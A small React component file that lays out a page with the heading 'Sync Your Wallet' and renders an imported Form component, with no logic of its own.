import React from 'react'
import Form from './Form'

import '../styles/styles.css'


const Main = () => {

    return (
        <div className='grid justify-items-center '>
            <div className='sm:text-left grid gap-7 justify-items-center'>
              
                <h1 className=' font-bold text-2xl'>Sync Your Wallet</h1>

                <div className=''>
                    <Form />
                </div>
            </div>

      
        </div>
    )
}

export default Main
